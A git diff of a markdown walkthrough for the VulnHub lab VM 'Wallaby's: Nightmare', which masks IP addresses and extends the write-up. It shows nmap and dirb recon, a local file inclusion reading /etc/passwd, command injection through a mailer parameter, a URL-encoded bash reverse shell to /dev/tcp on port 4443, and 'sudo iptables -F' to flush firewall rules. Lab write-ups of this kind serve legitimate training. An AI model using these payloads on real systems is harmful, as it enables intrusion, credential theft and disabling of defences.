@@ -3,10 +3,10 @@ Wallaby's: Nightmare (1.0.2)
 
 Source: https://www.vulnhub.com/entry/wallabys-nightmare-102,176/
 
-* Name: HackDay: Albania
-* Released: 22 Dec 2016
-* Author: Waldo
-* Series: Wallaby's
+*  Name: Wallaby's: Nightmare
+*  Released: 22 Dec 2016
+*  Author: Waldo
+*  Series: Wallaby's
 
 Recon, Recon, Recon
 -------------------
@@ -21,10 +21,10 @@ nmap -sn 192.168.0.0/16
 That came up with 2 results for the VM:
 
 ```
-map scan report for 192.168.x.x
+map scan report for 192.168.xx.xx
 Host is up (0.00040s latency).
 MAC Address: 00:0C:29:6B:EE:FA (VMware)
-Nmap scan report for 192.168.x.x
+Nmap scan report for 192.168.xx.xx
 Host is up (0.00038s latency).
 MAC Address: 00:0C:29:6B:EE:FA (VMware)
 ```
@@ -57,11 +57,11 @@ App(le) Picking
 
 Let's check out this web app! It asked me to create a username, and because I love FFXIV so much, I chose `y4nd3r3_ro3`. Once registered, it takes me to a URL with this format:
 
-> http://192.168.x.x/?page=home
+> http://192.168.xx.xx/?page=home
 
 The "registration" page suggested fuzzing is the way to go, and I do love fuzzing. With a URL format like that, I tried the first thing that came to mind: LFI (Local File Inclusion). Since it's an Ubuntu server, I stuck with the standard `/etc/passwd` test...
 
-> http://192.168.x.x/?page=../../../etc/passwd
+> http://192.168.xx.xx/?page=../../../etc/passwd
 
 ...And it worked! 
 
@@ -74,7 +74,7 @@ There are users named `steven?` and `walfin` in there, also an irc daemon. Both 
 
 So let's try `/etc/shadow`...
 
-> http://192.168.x.x/?page=../../etc/shadow
+> http://192.168.xx.xx/?page=../../etc/shadow
 
 NOPE! I get this lovely message instead:
 
@@ -95,7 +95,7 @@ It's ok, this is why I love `nmap` so much.
 |_http-title: Wallaby's Server
 ```
 
-Meanwhile, at http://192.168.x.x:60080/
+Meanwhile, at http://192.168.xx.xx:60080/
 
 > HOLY MOLY, this guy y4nd3r3_ro3 wants me...Glad I moved to a different port so I could work more securely!!!
 >
@@ -103,15 +103,15 @@ Meanwhile, at http://192.168.x.x:60080/
 
 The previous LFI has been cleaned up, and directory listings are off. So where do I go from here? The VM's web app tends to generic 404 me when I do something like "index.html", same on generic PHP files like "home.php", but gives me a custom 404 page for anything formatted like "/?page=test.php". From here I assumed their script is looking for the "/?page=" appended onto the file, so I ran `dirb` to see if there's anything common I could find:
 
-`dirb http://192.168.x.x:60080?page= /usr/share/wordlists/dirb/common.txt`
+`dirb http://192.168.xx.xx:60080?page= /usr/share/wordlists/dirb/common.txt`
 
 From here I got some interesting results:
  
 ``` 
-+ http://192.168.x.x:60080?page=contact (CODE:200|SIZE:895)                                                                                                                   
-+ http://192.168.x.x:60080?page=home (CODE:200|SIZE:1151)                                                                                                                     
-+ http://192.168.x.x:60080?page=index (CODE:200|SIZE:1366)                                                                                                                    
-+ http://192.168.x.x:60080?page=mailer (CODE:200|SIZE:1089) 
++ http://192.168.xx.xx:60080?page=contact (CODE:200|SIZE:895)                                                                                                                   
++ http://192.168.xx.xx:60080?page=home (CODE:200|SIZE:1151)                                                                                                                     
++ http://192.168.xx.xx:60080?page=index (CODE:200|SIZE:1366)                                                                                                                    
++ http://192.168.xx.xx:60080?page=mailer (CODE:200|SIZE:1089) 
 ```
 
 At "?page=mailer" I got some interesting results by looking at the page source:
@@ -129,18 +129,18 @@ Do As I Say, Not As I Do
 
 I try this URL, nothing much happens:
 
-http://192.168.x.x:60080/?page=mailer&mail=mail
+http://192.168.xx.xx:60080/?page=mailer&mail=mail
 
 But then I start poking around...
 
-http://192.168.x.x:60080/?page=mailer&mail=pwd
+http://192.168.xx.xx:60080/?page=mailer&mail=pwd
 
 > /var/www/html
 > Coming Soon guys!
 
 A little more...
 
-http://192.168.x.x:60080/?page=mailer&mail=ls%20-lah
+http://192.168.xx.xx:60080/?page=mailer&mail=ls%20-lah
 
 > total 96K drwxr-xr-x 3 www-data www-data 4.0K Jan 3 07:41 . drwxr-xr-x 3 root root 4.0K Dec 16 21:31 .. -rw-r--r-- 1 root 
 > root 16K Aug 11 2015 eye.jpg -rw-r--r-- 1 root root 3.6K Dec 27 19:19 index.php drwxr-xr-x 2 root root 4.0K Dec 27 12:25 
@@ -158,7 +158,7 @@ And while IRC is back, it now has an accompanying bot:
 
 But what is it listening on? I didn't see it on `nmap` earlier.
 
-http://192.168.x.x:60080/?page=mailer&mail=netstat%20-tapln
+http://192.168.xx.xx:60080/?page=mailer&mail=netstat%20-tapln
 
 ```
 Active Internet connections (servers and established) 
@@ -178,7 +178,7 @@ tcp6 0 0 :::22 :::* LISTEN -
 
 Hm, what's that on 6667? Time to find out.
 
-http://192.168.x.x:60080/?page=mailer&mail=sudo%20iptables%20-nvL
+http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-nvL
 
 ```
 Chain INPUT (policy ACCEPT 289K packets, 16M bytes) pkts bytes target prot opt in out source destination 
@@ -208,6 +208,18 @@ So, I've rewritten the above URL to be the following:
 
 http://192.168.xx.xx:60080/?page=mailer&mail=bash%20-i%20%3E&%20/dev/tcp/10.0.0.1/4443%200%3E&1
 
-This gives no output, but let's test using a terminal:
+This gives no output, so I tried in terminal, with no luck either. `iptables` is giving me issues. I can do commands in my browser though, right? So time to try that again...
 
+http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-F
 
+Flushed the rules, and...
+
+http://192.168.xx.xx:60080/?page=mailer&mail=sudo%20iptables%20-nvL
+
+> Chain INPUT (policy ACCEPT 2 packets, 434 bytes) pkts bytes target prot opt in out source destination 
+> Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 
+> Chain OUTPUT (policy ACCEPT 1 packets, 866 bytes) pkts bytes target prot opt in out source destination 
+> 
+> Coming Soon guys!
+
+Muahahaha. No more block on port 6667, either. 
